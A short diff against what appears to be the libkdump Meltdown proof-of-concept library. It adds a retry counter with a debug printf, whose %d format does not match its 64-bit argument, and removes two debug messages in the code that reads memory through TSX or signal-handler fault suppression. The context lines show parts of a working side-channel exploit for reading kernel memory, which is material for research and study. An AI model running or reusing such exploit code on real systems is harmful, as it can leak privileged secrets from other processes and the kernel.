@@ -511,10 +511,13 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
 int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
+  uint64_t count = 0;
 
   while (retries--) {
     if (!setjmp(buf)) {
       //jump to meltdown
+      count++;
+      printf("here for the %d time", count);
       MELTDOWN;
     }
 
@@ -551,11 +554,9 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   for (i = 0; i < config.measurements; i++) {
     if (config.fault_handling == TSX) {
       //read using TSX
-      debug(INFO, "I AM READING TSX!!!");
       r = libkdump_read_tsx();
     } else {
       //otherwise read using normal fault handling?
-      debug(INFO, "I AM READING SIGNAL HANDLER!!!");
       r = libkdump_read_signal_handler();
     }
     //populates the table with value of the character read from meltdown and flush & reload
